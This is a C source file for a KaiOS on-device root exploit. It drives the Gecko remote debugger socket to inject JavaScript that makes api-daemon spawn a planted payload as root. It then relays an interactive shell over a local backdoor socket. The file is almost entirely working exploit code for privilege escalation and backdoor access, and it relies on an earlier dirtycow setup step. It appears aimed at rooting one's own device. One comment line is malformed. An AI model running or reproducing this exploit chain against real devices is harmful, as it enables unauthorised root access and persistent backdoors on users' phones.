/*
	KaiOS self-root trigger + interactive root shell

	Replaces the Python RDP exploit script. Runs entirely on-device.
	After one-time dirtycow setup, just run this to get a root shell.

	Prerequisites (one-time):
		- config.toml rewritten: remote_services_path = "/data/local/tmp/rsvc/"
		- services.toml with: pwn = -10000
		- payload_v2 at /data/local/tmp/rsvc/pwn/daemon
		- Device rebooted (api-daemon loads config, chowns payload to root)

	Build:  arm-linux-gnueabi-gcc -static -o kairoot kairoot.c
	Usage:  ./kairoot [--connect|-c] [backdoor_socket]

	Flow:
		1. Connect to /data/local/debugger-socket (mode 0666)
		2. Gecko RDP: listTabs -> launch Multi Store -> getAppActor -> attach
		3. evaluateJS: load shim -> getToken -> WS -> getService("pwn")
		4. api-daemon spawns payload_v2 as root
		5. Connect to backdoor, send terminal size, raw-mode relay
*/

#include <sys/socket.h>
#include <sys/un.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>

#define DEBUGGER_SOCKET "/data/local/debugger-socket"
#define MULTI_STORE_MANIFEST "app://multi.store.bananahackers.net/manifest.webapp"
#define DEFAULT_BACKDOOR "/data/local/tmp/rsock"
#define BUF_SIZE 65536

// JS that triggers the spawn. Callback-based (B2G 2.5 evaluateJS
// doesn't await Promises). Single quotes only -> safe in JSON string.

static const char *SPAWN_JS =
"(function(){"
"function L(u,c){var s=document.createElement('script');s.src=u;"
"s.onload=function(){c()};s.onerror=function(){c(1)};document.head.appendChild(s)}"
"function S2(){if(typeof lib_session==='undefined')"
"L('http://127.0.0.1:8081/api/v1/shared/session.js',S3);else S3()}"
"function S3(){if(typeof navigator.externalapi==='undefined')return;"
"var s=new lib_session.Session();"
"s.open_url('ws://127.0.0.1:8081/',null,{"
"onsessionconnected:function(){"
"var m=KaiOS.core.CoreRequest.create({getService:{name:'pwn'}});"
"var c=KaiOS.core.CoreRequest.encodeDelimited(m).finish();"
"var b=KaiOS.core.BaseMessage.create({service:0,object:0,content:c});"
"s.send_request(b,KaiOS.core.CoreResponse)},"
"onsessionconnectionerror:function(){},"
"onsessiondisconnected:function(){}},false)}"
"if(typeof KaiOS==='undefined'||typeof KaiOS.core==='undefined')"
"L('http://127.0.0.1:8081/api/v1/shared/core.js',S2);else S2()})()";

typedef struct
{
	int fd;
	char buf[BUF_SIZE];
	size_t buf_len;
} rdp_t;

static void die(const char *msg)
{
	fprintf(stderr, "kairoot: %s: %s\n", msg, strerror(errno));
	exit(1);
}

static int rdp_connect(const char *path)
{
	int fd = socket(AF_UNIX, SOCK_STREAM, 0);
	if (fd < 0) return -1;
	struct sockaddr_un addr;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, path, sizeof(addr.sun_path) - 1);
	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		close(fd); return -1;
	}
	return fd;
}

static void rdp_send(rdp_t *r, const char *json)
{
	char hdr[32];
	int hlen = snprintf(hdr, sizeof(hdr), "%zu:", strlen(json));
	if (write(r->fd, hdr, hlen) != hlen) die("write header");
	if (write(r->fd, json, strlen(json)) != (ssize_t)strlen(json)) die("write body");
}

static void rdp_sendf(rdp_t *r, const char *fmt, ...)
{
	char json[8192];
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(json, sizeof(json), fmt, ap);
	va_end(ap);
	rdp_send(r, json);
}

static char *rdp_recv(rdp_t *r, int timeout_sec)
{
	struct timeval tv = {timeout_sec, 0};
	setsockopt(r->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	for (;;)
	{
		size_t i;
		for (i = 0; i < r->buf_len; i++)
		{
			if (!isdigit((unsigned char)r->buf[i])) break;
		}
		if (i > 0 && i < r->buf_len && r->buf[i] == ':')
		{
			char lb[16];
			memcpy(lb, r->buf, i); lb[i] = '\0';
			size_t mlen = strtoul(lb, NULL, 10);
			size_t start = i + 1, end = start + mlen;
			if (r->buf_len >= end)
			{
				char *msg = malloc(mlen + 1);
				if (!msg) return NULL;
				memcpy(msg, r->buf + start, mlen);
				msg[mlen] = '\0';
				memmove(r->buf, r->buf + end, r->buf_len - end);
				r->buf_len -= end;
				return msg;
			}
		}
		if (r->buf_len > 0 && !isdigit((unsigned char)r->buf[0]))
		{
			memmove(r->buf, r->buf + 1, --r->buf_len);
			continue;
		}
		ssize_t n = read(r->fd, r->buf + r->buf_len, sizeof(r->buf) - r->buf_len);
		if (n <= 0) return NULL;
		r->buf_len += n;
	}
}

static char *rdp_waitfor(rdp_t *r, const char *key, int timeout)
{
	for (;;)
	{
		char *msg = rdp_recv(r, timeout);
		if (!msg) return NULL;
		if (strstr(msg, key)) return msg;
		if (strstr(msg, "\"error\""))
		{
			fprintf(stderr, "[-] RDP error: %.300s\n", msg);
			free(msg);
			return NULL;
		}
		free(msg);
		timeout = 2;
	}
}

static void rdp_drain(rdp_t *r, int timeout)
{
	char *msg;
	while ((msg = rdp_recv(r, timeout)) != NULL)
	{
		free(msg);
		timeout = 1;
	}
}

// Extract the nth (0-based) string value for a key from JSON
static int json_str(const char *json, const char *key, int nth,
	char *out, size_t outlen)
{
	char pat[128];
	snprintf(pat, sizeof(pat), "\"%s\"", key);
	const char *p = json;

	for (int i = 0; i <= nth; i++)
	{
		p = strstr(p, pat);
		if (!p) return -1;
		p += strlen(pat);
	}

	while (*p && *p != ':')
	{
		p++;
	}
	if (*p != ':') return -1;
	p++;
	while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')
	{
		p++;
	}
	if (*p != '"') return -1;
	p++;
	size_t i = 0;
	while (*p && *p != '"' && i < outlen - 1)
	{
		if (*p == '\\' && p[1]) { out[i++] = p[1]; p += 2; }
		else out[i++] = *p++;
	}
	out[i] = '\0';
	return 0;
}

static int is_socket_file(const char *path)
{
	struct stat st;
	return stat(path, &st) == 0 && S_ISSOCK(st.st_mode);
}

static int connect_unix(const char *path)
{
	int fd = socket(AF_UNIX, SOCK_STREAM, 0);
	if (fd < 0) return -1;
	struct sockaddr_un addr;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, path, sizeof(addr.sun_path) - 1);
	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		close(fd); return -1;
	}
	return fd;
}

// Send terminal size to the server as a 6-byte magic header.
// Server peeks for this, if absent, uses 80x24 default.
static void send_term_size(int fd)
{
	struct winsize ws;
	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0 &&
		ws.ws_row > 0 && ws.ws_col > 0)
	{
		unsigned char hdr[6] = {0x7F, 'K',
			(unsigned char)((ws.ws_row >> 8) & 0xFF),
			(unsigned char)(ws.ws_row & 0xFF),
			(unsigned char)((ws.ws_col >> 8) & 0xFF),
			(unsigned char)(ws.ws_col & 0xFF)};
		write(fd, hdr, 6);
	}
}

static void raw_mode(struct termios *saved)
{
	if (tcgetattr(STDIN_FILENO, saved) != 0) return;
	struct termios raw = *saved;
	raw.c_iflag &= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL|IXON);
	raw.c_oflag &= ~OPOST;
	raw.c_lflag &= ~(ECHO|ECHONL|ICANON|ISIG|IEXTEN);
	raw.c_cflag &= ~(CSIZE|PARENB);
	raw.c_cflag |= CS8;
	tcsetattr(STDIN_FILENO, TCSANOW, &raw);
}

static void relay_shell(int fd)
{
	struct termios saved;
	int was_raw = (tcgetattr(STDIN_FILENO, &saved) == 0);
	if (was_raw) raw_mode(&saved);

	send_term_size(fd);
	fprintf(stderr, "\r\n[*] Root shell ready. Type 'exit' or Ctrl-D to quit.\r\n\n");

	fd_set fds;
	char buf[4096];
	int maxfd = (fd > STDIN_FILENO ? fd : STDIN_FILENO) + 1;
	for (;;)
	{
		FD_ZERO(&fds);
		FD_SET(STDIN_FILENO, &fds);
		FD_SET(fd, &fds);
		if (select(maxfd, &fds, NULL, NULL, NULL) < 0)
		{
			if (errno == EINTR) continue;
			break;
		}
		if (FD_ISSET(STDIN_FILENO, &fds))
		{
			ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n <= 0) break;
			if (write(fd, buf, n) != n) break;
		}
		if (FD_ISSET(fd, &fds))
		{
			ssize_t n = read(fd, buf, sizeof(buf));
			if (n <= 0) break;
			if (write(STDOUT_FILENO, buf, n) != n) break;
		}
	}
	if (was_raw) tcsetattr(STDIN_FILENO, TCSANOW, &saved);
	fprintf(stderr, "\r\n[*] Disconnected.\n");
}

static void trigger_spawn(void)
{
	fprintf(stderr, "[*] KaiOS self-root trigger\n");

	fprintf(stderr, "[*] Connecting to %s...\n", DEBUGGER_SOCKET);
	rdp_t r;
	memset(&r, 0, sizeof(r));
	r.fd = rdp_connect(DEBUGGER_SOCKET);
	if (r.fd < 0) die("connect debugger socket");

	// hello
	char *hello = rdp_recv(&r, 3);
	if (hello) free(hello);

	// listTabs -> webappsActor
	fprintf(stderr, "[*] listTabs...\n");
	rdp_sendf(&r, "{\"to\":\"root\",\"type\":\"listTabs\"}");
	char *resp = rdp_waitfor(&r, "webappsActor", 5);
	if (!resp) die("no webappsActor");
	char webapps_actor[256];
	if (json_str(resp, "webappsActor", 0, webapps_actor, sizeof(webapps_actor)) < 0)
		die("extract webappsActor");
	free(resp);
	fprintf(stderr, "[+] webappsActor: %s\n", webapps_actor);

	// launch Multi Store
	fprintf(stderr, "[*] Launching Multi Store...\n");
	rdp_sendf(&r, "{\"to\":\"%s\",\"type\":\"launch\",\"manifestURL\":\"%s\"}",
			webapps_actor, MULTI_STORE_MANIFEST);
	rdp_drain(&r, 3);
	fprintf(stderr, "[*] Waiting 8s for app start...\n");
	sleep(8);

	// getAppActor -> consoleActor
	fprintf(stderr, "[*] getAppActor...\n");
	rdp_sendf(&r, "{\"to\":\"%s\",\"type\":\"getAppActor\",\"manifestURL\":\"%s\"}",
			webapps_actor, MULTI_STORE_MANIFEST);
	resp = rdp_waitfor(&r, "consoleActor", 5);

	if (!resp) die("no consoleActor");
	char tab_actor[256], console_actor[256];

	// "actor" appears twice: outer object wrapper (nth=0) and the
	// tab actor string inside it (nth=1)
	if (json_str(resp, "actor", 1, tab_actor, sizeof(tab_actor)) < 0)
		die("extract tab actor");
	if (json_str(resp, "consoleActor", 0, console_actor, sizeof(console_actor)) < 0)
		die("extract consoleActor");
	free(resp);
	fprintf(stderr, "[+] tab: %s\n", tab_actor);
	fprintf(stderr, "[+] console: %s\n", console_actor);

	// attach
	fprintf(stderr, "[*] Attaching...\n");
	rdp_sendf(&r, "{\"to\":\"%s\",\"type\":\"attach\"}", tab_actor);
	rdp_drain(&r, 3);

	/ evaluateJS -> trigger spawn
	fprintf(stderr, "[*] evaluateJS (triggering spawn)...\n");
	rdp_sendf(&r, "{\"to\":\"%s\",\"type\":\"evaluateJS\",\"text\":\"%s\"}",
			console_actor, SPAWN_JS);
	rdp_drain(&r, 3);
	close(r.fd);
}

int main(int argc, char **argv)
{
	const char *backdoor = DEFAULT_BACKDOOR;
	int skip_trigger = 0;

	for (int i = 1; i < argc; i++)
	{
		if (!strcmp(argv[i], "--connect") || !strcmp(argv[i], "-c"))
			skip_trigger = 1;
		else if (argv[i][0] != '-')
			backdoor = argv[i];
	}

	if (!skip_trigger && is_socket_file(backdoor))
	{
		fprintf(stderr, "[*] Backdoor exists, connecting directly.\n");
		skip_trigger = 1;
	}

	if (!skip_trigger)
	{
		trigger_spawn();
		fprintf(stderr, "[*] Waiting for backdoor at %s...\n", backdoor);
		int found = 0;
		for (int i = 0; i < 20; i++)
		{
			sleep(1);
			if (is_socket_file(backdoor))
			{
				found = 1;
				break;
			}
		}
		if (!found)
		{
			fprintf(stderr, "[-] Backdoor did not appear. Check:\n"
					"    - config.toml has remote_services_path=/data/local/tmp/rsvc/\n"
					"    - services.toml has pwn=-10000\n"
					"    - payload_v2 at /data/local/tmp/rsvc/pwn/daemon\n"
					"    - api-daemon restarted after config change\n");
			return 1;
		}
		fprintf(stderr, "[+] Backdoor is up!\n");
		sleep(1); // let shell server finish setting up
	}

	fprintf(stderr, "[*] Connecting to %s...\n", backdoor);
	int bfd = connect_unix(backdoor);
	if (bfd < 0) die("connect backdoor");
	relay_shell(bfd);
	close(bfd);
	return 0;
}
